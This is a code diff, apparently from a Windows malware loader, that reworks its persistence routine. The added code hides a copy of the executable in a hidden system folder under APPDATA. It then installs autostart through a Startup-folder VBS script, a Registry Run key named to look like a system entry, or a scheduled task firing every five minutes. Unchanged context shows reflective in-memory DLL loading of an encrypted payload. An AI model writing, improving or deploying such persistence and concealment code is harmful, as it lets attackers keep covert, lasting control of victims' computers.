@@ -11,96 +11,186 @@ void hex_to_bytes(const char *hex, unsigned char *bytes, size_t len) {
     }
 }
 
-void create_persistence(const char *method) {
-    if (strcmp(method, "None") == 0) {
-        return;
+// Function to create hidden binary in %APPDATA%
+BOOL create_hidden_binary(char *hidden_binary, size_t hidden_binary_size, const char *bin_path, const char *bin_name) {
+    char appdata[MAX_PATH];
+    if (!GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH)) {
+        return FALSE;
     }
-    char bin_path[MAX_PATH];
-    GetModuleFileNameA(NULL, bin_path, MAX_PATH);
-    char *bin_name = strrchr(bin_path, '\\') ? strrchr(bin_path, '\\') + 1 : bin_path;
 
-    if (strcmp(method, "Registry Run Key") == 0) {
-        HKEY hKey;
-        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
-        if (result == ERROR_SUCCESS) {
-            char rand_str[9];
-            snprintf(rand_str, sizeof(rand_str), "%08lx", GetTickCount());
-            char hidden_service[32];
-            snprintf(hidden_service, sizeof(hidden_service), "SystemConfig_%s", rand_str);
-            RegSetValueExA(hKey, hidden_service, 0, REG_SZ, (const BYTE*)bin_path, strlen(bin_path) + 1);
-            RegCloseKey(hKey);
-        }
-        return;
-    }
-    if (strcmp(method, "Startup Folder") == 0) {
-        char temp_dir[MAX_PATH];
-        GetTempPathA(MAX_PATH, temp_dir);
-
-        // Count dot-prefixed folders in temp directory
-        char search_path[MAX_PATH];
-        snprintf(search_path, MAX_PATH, "%s\\.*", temp_dir);
-        WIN32_FIND_DATAA findData;
-        HANDLE hFind = FindFirstFileA(search_path, &findData);
-        int dot_folder_count = 0;
-        char existing_folder[MAX_PATH] = "";
-        if (hFind != INVALID_HANDLE_VALUE) {
-            do {
-                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                    if (strncmp(findData.cFileName, ".", 1) == 0 && strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
-                        dot_folder_count++;
-                        if (dot_folder_count == 1) {
-                            snprintf(existing_folder, MAX_PATH, "%s\\%s", temp_dir, findData.cFileName);
-                        }
+    char rand_str[9];
+    snprintf(rand_str, sizeof(rand_str), "%08lx", GetTickCount());
+    char search_path[MAX_PATH];
+    snprintf(search_path, MAX_PATH, "%s\\.*", appdata);
+    WIN32_FIND_DATAA findData;
+    HANDLE hFind = FindFirstFileA(search_path, &findData);
+    int dot_folder_count = 0;
+    char existing_folder[MAX_PATH] = "";
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                if (strncmp(findData.cFileName, ".", 1) == 0 && strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
+                    dot_folder_count++;
+                    if (dot_folder_count == 1) {
+                        snprintf(existing_folder, MAX_PATH, "%s\\%s", appdata, findData.cFileName);
                     }
                 }
-            } while (FindNextFileA(hFind, &findData));
-            FindClose(hFind);
-        }
+            }
+        } while (FindNextFileA(hFind, &findData));
+        FindClose(hFind);
+    }
 
-        char hidden_folder[MAX_PATH];
-        if (dot_folder_count >= 2 && strlen(existing_folder) > 0) {
-            // Reuse the first existing dot-prefixed folder
-            strncpy(hidden_folder, existing_folder, MAX_PATH);
-        } else {
-            // Create a new folder
+    char hidden_folder[MAX_PATH];
+    if (dot_folder_count >= 2 && strlen(existing_folder) > 0) {
+        strncpy(hidden_folder, existing_folder, MAX_PATH);
+    } else {
+        snprintf(hidden_folder, MAX_PATH, "%s\\.%.8s", appdata, rand_str);
+        if (!CreateDirectoryA(hidden_folder, NULL)) {
+            return FALSE;
+        }
+    }
+    SetFileAttributesA(hidden_folder, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+
+    snprintf(hidden_binary, hidden_binary_size, "%s\\%s", hidden_folder, bin_name);
+    if (!CopyFileA(bin_path, hidden_binary, FALSE)) {
+        return FALSE;
+    }
+    SetFileAttributesA(hidden_binary, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+
+    return TRUE;
+}
+
+void create_persistence(unsigned char persistence) {
+    if (persistence == 0) {
+        return;
+    }
+
+    char bin_path[MAX_PATH];
+    if (!GetModuleFileNameA(NULL, bin_path, MAX_PATH)) {
+        return;
+    }
+    char *bin_name = strrchr(bin_path, '\\') ? strrchr(bin_path, '\\') + 1 : bin_path;
+
+    char hidden_binary[MAX_PATH];
+    switch (persistence) {
+        case 1: // Startup Folder
+        {
+            if (!create_hidden_binary(hidden_binary, MAX_PATH, bin_path, bin_name)) {
+                return;
+            }
+            char appdata_vbs[MAX_PATH];
+            if (!GetEnvironmentVariableA("APPDATA", appdata_vbs, MAX_PATH)) {
+                return;
+            }
+            char startup_folder[MAX_PATH];
+            snprintf(startup_folder, MAX_PATH, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", appdata_vbs);
+            CreateDirectoryA(startup_folder, NULL);
+            char vbs_path[MAX_PATH];
+            char rand_str_vbs[9];
+            snprintf(rand_str_vbs, sizeof(rand_str_vbs), "%08lx", GetTickCount());
+            char hidden_service[32];
+            snprintf(hidden_service, sizeof(hidden_service), "SystemConfig_%s", rand_str_vbs);
+            snprintf(vbs_path, MAX_PATH, "%s\\%.8s.vbs", startup_folder, hidden_service);
+            char vbs_content[512];
+            snprintf(vbs_content, sizeof(vbs_content), "Set WShell = CreateObject(\"WScript.Shell\")\nWShell.Run \"\"\"%s\"\"\", 0, False\n", hidden_binary);
+            HANDLE hFile = CreateFileA(vbs_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hFile == INVALID_HANDLE_VALUE) {
+                return;
+            }
+            DWORD bytesWritten;
+            WriteFile(hFile, vbs_content, strlen(vbs_content), &bytesWritten, NULL);
+            CloseHandle(hFile);
+            return;
+        }
+        case 2: // Registry Run Key
+        {
+            if (!create_hidden_binary(hidden_binary, MAX_PATH, bin_path, bin_name)) {
+                return;
+            }
+            HKEY hKey;
+            LONG result = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+                                          0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
+            if (result != ERROR_SUCCESS) {
+                return;
+            }
             char rand_str[9];
             snprintf(rand_str, sizeof(rand_str), "%08lx", GetTickCount());
-            snprintf(hidden_folder, MAX_PATH, "%s\\.%.8s", temp_dir, rand_str);
-            CreateDirectoryA(hidden_folder, NULL);
-        }
-
-        char hidden_binary[MAX_PATH];
-        snprintf(hidden_binary, MAX_PATH, "%s\\%s", hidden_folder, bin_name);
-        CopyFileA(bin_path, hidden_binary, FALSE);
-
-        char appdata[MAX_PATH];
-        if (!GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH)) {
+            char hidden_service[128];
+            snprintf(hidden_service, sizeof(hidden_service), "SystemConfig_%s", rand_str);
+            result = RegSetValueExA(hKey, hidden_service, 0, REG_SZ, (const BYTE*)hidden_binary, strlen(hidden_binary) + 1);
+            RegCloseKey(hKey);
+            if (result != ERROR_SUCCESS) {
+                return;
+            }
             return;
         }
-        char startup_folder[MAX_PATH];
-        snprintf(startup_folder, MAX_PATH, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", appdata);
-        CreateDirectoryA(startup_folder, NULL);
-
-        char vbs_path[MAX_PATH];
-        char rand_str[9];
-        snprintf(rand_str, sizeof(rand_str), "%08lx", GetTickCount());
-        char hidden_service[32];
-        snprintf(hidden_service, sizeof(hidden_service), "SystemConfig_%s", rand_str);
-        snprintf(vbs_path, MAX_PATH, "%s\\%.8s.vbs", startup_folder, hidden_service);
-        char vbs_content[512];
-        snprintf(vbs_content, sizeof(vbs_content), "Set WShell = CreateObject(\"WScript.Shell\")\nWShell.Run \"\"\"%s\"\"\", 0, False\n", hidden_binary);
-        HANDLE hFile = CreateFileA(vbs_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hFile == INVALID_HANDLE_VALUE) {
+        case 3: // Task Scheduler
+        {
+            if (!create_hidden_binary(hidden_binary, MAX_PATH, bin_path, bin_name)) {
+                return;
+            }
+            char batch_path[MAX_PATH];
+            snprintf(batch_path, MAX_PATH, "%s\\run.bat", strrchr(hidden_binary, '\\') ? hidden_binary : ".");
+            char batch_content[512];
+            snprintf(batch_content, sizeof(batch_content), 
+                    "@echo off\n"
+                    "set FLAG=\"%%~dp0.last_run\"\n"
+                    "set /a TIMEOUT=300\n"
+                    "if not exist \"%%FLAG%%\" goto RUN\n"
+                    "for /f %%t in (\"%%FLAG%%\") do set LAST=%%t\n"
+                    "for /f \"tokens=1-2 delims=:.\" %%a in (\"%%TIME%%\") do set /a NOW=%%a*3600+%%b*60\n"
+                    "for /f \"tokens=1-2 delims=:.\" %%c in (\"%%LAST%%\") do set /a OLD=%%c*3600+%%d*60\n"
+                    "if %%NOW%% lss %%OLD%% set /a NOW+=86400\n"
+                    "if %%NOW%%-%%OLD%% geq %%TIMEOUT%% goto RUN\n"
+                    "exit /b\n"
+                    ":RUN\n"
+                    "start /MIN \"\" \"%s\"\n"
+                    "echo %%TIME:~0,5%% > \"%%FLAG%%\"\n",
+                    hidden_binary);
+            HANDLE hFile = CreateFileA(batch_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hFile == INVALID_HANDLE_VALUE) {
+                return;
+            }
+            DWORD bytesWritten;
+            WriteFile(hFile, batch_content, strlen(batch_content), &bytesWritten, NULL);
+            CloseHandle(hFile);
+            char vbs_path[MAX_PATH];
+            snprintf(vbs_path, MAX_PATH, "%s\\run.vbs", strrchr(hidden_binary, '\\') ? hidden_binary : ".");
+            char vbs_content[256];
+            snprintf(vbs_content, sizeof(vbs_content), 
+                    "Set WShell = CreateObject(\"WScript.Shell\")\n"
+                    "WShell.Run \"cmd.exe /c \"\"%s\"\"\", 0, True\n",
+                    batch_path);
+            hFile = CreateFileA(vbs_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hFile == INVALID_HANDLE_VALUE) {
+                return;
+            }
+            WriteFile(hFile, vbs_content, strlen(vbs_content), &bytesWritten, NULL);
+            CloseHandle(hFile);
+            char cmd[512];
+            char rand_str[9];
+            snprintf(rand_str, sizeof(rand_str), "%08lx", GetTickCount());
+            char task_name[32];
+            snprintf(task_name, sizeof(task_name), "SystemConfig_%s", rand_str);
+            snprintf(cmd, sizeof(cmd), 
+                    "schtasks /create /tn \"%s\" /tr \"wscript.exe \"\"%s\"\"\" /sc minute /mo 5 /f",
+                    task_name, vbs_path);
+            SHELLEXECUTEINFOA sei = { sizeof(sei) };
+            sei.lpVerb = "open";
+            sei.lpFile = "cmd.exe";
+            sei.lpParameters = cmd;
+            sei.nShow = SW_HIDE;
+            if (!ShellExecuteExA(&sei)) {
+                return;
+            }
             return;
         }
-        DWORD bytesWritten;
-        WriteFile(hFile, vbs_content, strlen(vbs_content), &bytesWritten, NULL);
-        CloseHandle(hFile);
+        default:
+            return;
     }
 }
 
 HMODULE LoadDllInMemory(void *dll_data, DWORD dll_size) {
-    char msg[256];
     if (!dll_data || dll_size < sizeof(IMAGE_DOS_HEADER)) {
         return NULL;
     }
@@ -124,7 +214,7 @@ HMODULE LoadDllInMemory(void *dll_data, DWORD dll_size) {
         return NULL;
     }
 
-    memcpy(imageBase, dll_data, ntHeader->OptionalHeader.SizeOfHeaders);
+    memcpy((BYTE*)imageBase, dll_data, ntHeader->OptionalHeader.SizeOfHeaders);
     PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeader);
     for (DWORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
         if (section[i].SizeOfRawData && section[i].PointerToRawData + section[i].SizeOfRawData <= dll_size) {
@@ -302,12 +392,12 @@ int main(int argc, char *argv[]) {
         unsigned char payload_data[1];
     } PayloadConfig;
     PayloadConfig *config = (PayloadConfig *)lpData;
-    const char *persistence_method = config->persistence == 0 ? "None" : config->persistence == 1 ? "Startup Folder" : config->persistence == 2 ? "Registry Run Key" : "None";
+
     int load_in_memory = (config->load_in_memory == 1);
     unsigned long long payload_size = config->payload_size;
     unsigned char *encrypted_payload = config->payload_data;
 
-    create_persistence(persistence_method);
+    create_persistence(config->persistence);
 
     if (!load_in_memory) {
         unsigned char key[32];
